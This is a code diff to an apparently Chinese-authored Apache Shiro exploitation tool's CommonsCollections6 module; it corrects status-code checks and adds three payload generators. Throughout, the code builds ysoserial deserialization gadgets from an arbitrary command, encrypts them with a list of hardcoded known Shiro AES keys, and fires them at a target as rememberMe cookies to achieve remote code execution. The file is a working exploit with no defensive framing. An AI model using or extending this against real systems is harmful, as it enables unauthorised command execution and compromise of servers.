@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # By 斯文beast  svenbeast.com
 
-import os
+import os   
 import base64
 import uuid
 import subprocess
@@ -35,7 +35,7 @@ class CommonsCollections6(object):
 
             payload2 = self.generator2(command, JAR_FILE)  # 生成payload2
             r2 = requests.get(target, cookies={'rememberMe': payload2.decode()}, timeout=20)  # 发送验证请求2
-            if(r.status_code==200):
+            if(r2.status_code==200):
                 print("[+]   CommonsCollections6模块   key2:wGiHplamyXlVB11UXWol8g== 已成功发送！")
                 print("[+]   状态码:"+str(r2.status_code))
             else:
@@ -45,7 +45,7 @@ class CommonsCollections6(object):
 
             payload3 = self.generator3(command, JAR_FILE)  # 生成payload3
             r3 = requests.get(target, cookies={'rememberMe': payload3.decode()}, timeout=20)  # 发送验证请求3
-            if(r.status_code==200):
+            if(r3.status_code==200):
                 print("[+]   CommonsCollections6模块   key3:2AvVhdsgUs0FSA3SDFAdag== 已成功发送！")
                 print("[+]   状态码:"+str(r3.status_code))
             else:
@@ -54,7 +54,7 @@ class CommonsCollections6(object):
 
             payload4 = self.generator4(command, JAR_FILE)  # 生成payload4
             r4 = requests.get(target, cookies={'rememberMe': payload4.decode()}, timeout=20)  # 发送验证请求4
-            if(r.status_code==200):
+            if(r4.status_code==200):
                 print("[+]   CommonsCollections6模块   key4:4AvVhmFLUs0KTA3Kprsdag== 已成功发送！")
                 print("[+]   状态码:"+str(r4.status_code))
             else:
@@ -63,7 +63,7 @@ class CommonsCollections6(object):
 
             payload5 = self.generator5(command, JAR_FILE)  # 生成payload5
             r5 = requests.get(target, cookies={'rememberMe': payload5.decode()}, timeout=20)  # 发送验证请求5
-            if(r.status_code==200):
+            if(r5.status_code==200):
                 print("[+]   CommonsCollections6模块   key5:3AvVhmFLUs0KTA3Kprsdag== 已成功发送！")
                 print("[+]   状态码:"+str(r5.status_code))
             else:
@@ -72,7 +72,7 @@ class CommonsCollections6(object):
 
             payload6 = self.generator6(command, JAR_FILE)  # 生成payload6
             r6 = requests.get(target, cookies={'rememberMe': payload6.decode()}, timeout=20)  # 发送验证请求6
-            if(r.status_code==200):
+            if(r6.status_code==200):
                 print("[+]   CommonsCollections6模块   key6:Z3VucwAAAAAAAAAAAAAAAA== 已成功发送！")
                 print("[+]   状态码:"+str(r6.status_code))
             else:
@@ -81,7 +81,7 @@ class CommonsCollections6(object):
 
             payload7 = self.generator7(command, JAR_FILE)  # 生成payload7
             r7 = requests.get(target, cookies={'rememberMe': payload7.decode()}, timeout=20)  # 发送验证请求2
-            if(r.status_code==200):
+            if(r7.status_code==200):
                 print("[+]   CommonsCollections6模块   key7:U3ByaW5nQmxhZGUAAAAAAA== 已成功发送！")
                 print("[+]   状态码:"+str(r7.status_code))
             else:
@@ -90,7 +90,7 @@ class CommonsCollections6(object):
 
             payload8 = self.generator8(command, JAR_FILE)  # 生成payload8
             r8 = requests.get(target, cookies={'rememberMe': payload8.decode()}, timeout=20)  # 发送验证请求8
-            if(r.status_code==200):
+            if(r8.status_code==200):
                 print("[+]   CommonsCollections6模块   key8:wGiHplamyXlVB11UXWol8g== 已成功发送！")
                 print("[+]   状态码:"+str(r8.status_code))
             else:
@@ -99,7 +99,7 @@ class CommonsCollections6(object):
 
             payload9 = self.generator9(command, JAR_FILE)  # 生成payload9
             r9 = requests.get(target, cookies={'rememberMe': payload9.decode()}, timeout=20)  # 发送验证请求9
-            if(r.status_code==200):
+            if(r9.status_code==200):
                 print("[+]   CommonsCollections6模块   key9:6ZmI6I2j5Y+R5aSn5ZOlAA== 已成功发送！")
                 print("[+]   状态码:"+str(r9.status_code))
             else:
@@ -119,7 +119,7 @@ class CommonsCollections6(object):
             #后补编码
             payload100 = self.generator100(command, JAR_FILE)  # 生成payload100
             r100 = requests.get(target, cookies={'rememberMe': payload100.decode()}, timeout=20)  # 发送验证请求100
-            if(r.status_code==200):
+            if(r100.status_code==200):
                 print("[+]   CommonsCollections6模块   key10:fCq+/xW488hMTCD+cmJ3aQ== 已成功发送！")
                 print("[+]   状态码:"+str(r100.status_code))
             else:
@@ -128,7 +128,7 @@ class CommonsCollections6(object):
             
             payload111 = self.generator111(command, JAR_FILE)  # 生成payload111
             r111 = requests.get(target, cookies={'rememberMe': payload111.decode()}, timeout=20)  # 发送验证请求111
-            if(r.status_code==200):
+            if(r111.status_code==200):
                 print("[+]   CommonsCollections6模块   key11:1QWLxg+NYmxraMoxAXu/Iw== 已成功发送！")
                 print("[+]   状态码:"+str(r111.status_code))
             else:
@@ -137,7 +137,7 @@ class CommonsCollections6(object):
             
             payload222 = self.generator222(command, JAR_FILE)  # 生成payload222
             r222 = requests.get(target, cookies={'rememberMe': payload222.decode()}, timeout=20)  # 发送验证请求222
-            if(r.status_code==200):
+            if(r222.status_code==200):
                 print("[+]   CommonsCollections6模块   key12:ZUdsaGJuSmxibVI2ZHc9PQ== 已成功发送！")
                 print("[+]   状态码:"+str(r222.status_code))
             else:
@@ -146,7 +146,7 @@ class CommonsCollections6(object):
             
             payload333 = self.generator333(command, JAR_FILE)  # 生成payload333
             r333 = requests.get(target, cookies={'rememberMe': payload333.decode()}, timeout=20)  # 发送验证请求333
-            if(r.status_code==200):
+            if(r333.status_code==200):
                 print("[+]   CommonsCollections6模块   key13:L7RioUULEFhRyxM7a2R/Yg== 已成功发送！")
                 print("[+]   状态码:"+str(r333.status_code))
             else:
@@ -155,7 +155,7 @@ class CommonsCollections6(object):
             
             payload444 = self.generator444(command, JAR_FILE)  # 生成payload444
             r444 = requests.get(target, cookies={'rememberMe': payload444.decode()}, timeout=20)  # 发送验证请求444
-            if(r.status_code==200):
+            if(r444.status_code==200):
                 print("[+]   CommonsCollections6模块   key14:r0e3c16IdVkouZgk1TKVMg== 已成功发送！")
                 print("[+]   状态码:"+str(r444.status_code))
             else:
@@ -166,7 +166,7 @@ class CommonsCollections6(object):
             
             payload666 = self.generator666(command, JAR_FILE)  # 生成payload666
             r666 = requests.get(target, cookies={'rememberMe': payload666.decode()}, timeout=20)  # 发送验证请求666
-            if(r.status_code==200):
+            if(r666.status_code==200):
                 print("[+]   CommonsCollections6模块   key15:5aaC5qKm5oqA5pyvAAAAAA== 已成功发送！")
                 print("[+]   状态码:"+str(r666.status_code))
             else:
@@ -175,7 +175,7 @@ class CommonsCollections6(object):
             
             payload777 = self.generator777(command, JAR_FILE)  # 生成payload777
             r777 = requests.get(target, cookies={'rememberMe': payload777.decode()}, timeout=20)  # 发送验证请求777
-            if(r.status_code==200):
+            if(r777.status_code==200):
                 print("[+]   CommonsCollections6模块   key16:bWluZS1hc3NldC1rZXk6QQ== 已成功发送！")
                 print("[+]   状态码:"+str(r777.status_code))
             else:
@@ -184,7 +184,7 @@ class CommonsCollections6(object):
             
             payload888 = self.generator888(command, JAR_FILE)  # 生成payload888
             r888 = requests.get(target, cookies={'rememberMe': payload888.decode()}, timeout=20)  # 发送验证请求888
-            if(r.status_code==200):
+            if(r888.status_code==200):
                 print("[+]   CommonsCollections6模块   key17:a2VlcE9uR29pbmdBbmRGaQ== 已成功发送！")
                 print("[+]   状态码:"+str(r888.status_code))
             else:
@@ -193,28 +193,39 @@ class CommonsCollections6(object):
             
             payload999 = self.generator999(command, JAR_FILE)  # 生成payload999
             r999 = requests.get(target, cookies={'rememberMe': payload999.decode()}, timeout=20)  # 发送验证请求999
-            if(r.status_code==200):
+            if(r999.status_code==200):
                 print("[+]   CommonsCollections6模块   key18:WcfHGU25gNnTxTlmJMeSpw== 已成功发送！")
                 print("[+]   状态码:"+str(r999.status_code))
             else:
                 print("[-]   CommonsCollections6模块   key18:WcfHGU25gNnTxTlmJMeSpw== 发送异常！")
                 print("[-]   状态码:"+str(r999.status_code))
-            '''
-            payload555 = self.generator555(command, JAR_FILE)  # 生成payload555
             
-            r555 = requests.get(target, cookies={'rememberMe': payload555.decode()}, timeout=20)  # 发送验证请求555
-            if(r.status_code==200):
-                print("[+]   CommonsCollections6模块   key19:ZWvohmPdUsAWT3=KpPqda 已成功发送！")
-                print("[+]   状态码:"+str(r555.status_code))
+            payload_001 = self.generator_001(command, JAR_FILE)  # 生成payload555
+            r_001 = requests.get(target, cookies={'rememberMe': payload_001.decode()}, timeout=20)  # 发送验证请求001
+            if(r_001.status_code==200):
+                print("[+]   CommonsCollections6模块   key19:bWljcm9zAAAAAAAAAAAAAA== 已成功发送！")
+                print("[+]   状态码:"+str(r_001.status_code))
+            else:
+                print("[-]   CommonsCollections6模块   key19:bWljcm9zAAAAAAAAAAAAAA== 发送异常！")
+                print("[-]   状态码:"+str(r_001.status_code))
+            payload_002 = self.generator_002(command, JAR_FILE)  # 生成payload1111
             
-            payload1111 = self.generator1111(command, JAR_FILE)  # 生成payload1111
-            
-            r1111 = requests.get(target, cookies={'rememberMe': payload555.decode()}, timeout=20)  # 发送验证请求1111
-            if(r.status_code==200):
-                print("[+]   CommonsCollections6模块   key20:LEGEND-CAMPUS-CIPHERKEY== 已成功发送！")
-                print("[+]   状态码:"+str(r1111.status_code))
-            '''  
-
+            r_002 = requests.get(target, cookies={'rememberMe': payload_002.decode()}, timeout=20)  # 发送验证请求002
+            if(r_002.status_code==200):
+                print("[+]   CommonsCollections6模块   key20:MTIzNDU2Nzg5MGFiY2RlZg== 已成功发送！")
+                print("[+]   状态码:"+str(r_002.status_code))
+            else:
+                print("[-]   CommonsCollections6模块   key20:MTIzNDU2Nzg5MGFiY2RlZg== 发送异常！")
+                print("[-]   状态码:"+str(r_002.status_code))
+             
+            payload_003 = self.generator_003(command, JAR_FILE)  # 生成payload1111
+            r_003 = requests.get(target, cookies={'rememberMe': payload_003.decode()}, timeout=20)  # 发送验证请求002
+            if(r_003.status_code==200):
+                print("[+]   CommonsCollections6模块   key21:5AvVhmFLUs0KTA3Kprsdag== 已成功发送！")
+                print("[+]   状态码:"+str(r_003.status_code))
+            else:
+                print("[-]   CommonsCollections6模块   key21:5AvVhmFLUs0KTA3Kprsdag== 发送异常！")
+                print("[-]   状态码:"+str(r_003.status_code))
            #后补编码
             
         except Exception as e:
@@ -630,6 +641,73 @@ class CommonsCollections6(object):
         base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
 
 
+        return base64_ciphertext
+
+    def generator_001(self,command, fp):
+        if not os.path.exists(fp):
+            raise Exception('jar file not found!')
+        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections6', command],       #popen
+                                 stdout=subprocess.PIPE)
+
+        BS = AES.block_size
+        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+        
+        key = "bWljcm9zAAAAAAAAAAAAAA=="    #key
+        
+        
+        mode = AES.MODE_CBC
+        iv = uuid.uuid4().bytes
+        
+        encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
+        
+        file_body = pad(popen.stdout.read())         #受popen影响的file_body
+
+
+        
+        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+
+
+        return base64_ciphertext
+        
+    def generator_002(self,command, fp):
+        if not os.path.exists(fp):
+            raise Exception('jar file not found!')
+        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections6', command],       #popen
+                                 stdout=subprocess.PIPE)
+
+        BS = AES.block_size
+        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+        
+        key = "MTIzNDU2Nzg5MGFiY2RlZg=="    #key
+        
+        
+        mode = AES.MODE_CBC
+        iv = uuid.uuid4().bytes
+        
+        encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
+        
+        file_body = pad(popen.stdout.read())         #受popen影响的file_body
+
+
+        
+        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+
+
+        return base64_ciphertext
+    def generator_003(self,command, fp):
+        if not os.path.exists(fp):
+            raise Exception('jar file not found!')
+        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections6', command],       #popen
+                                 stdout=subprocess.PIPE)
+
+        BS = AES.block_size
+        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+        key = "5AvVhmFLUs0KTA3Kprsdag=="    #key
+        mode = AES.MODE_CBC
+        iv = uuid.uuid4().bytes
+        encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
+        file_body = pad(popen.stdout.read())         #受popen影响的file_body
+        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
         return base64_ciphertext
 
 
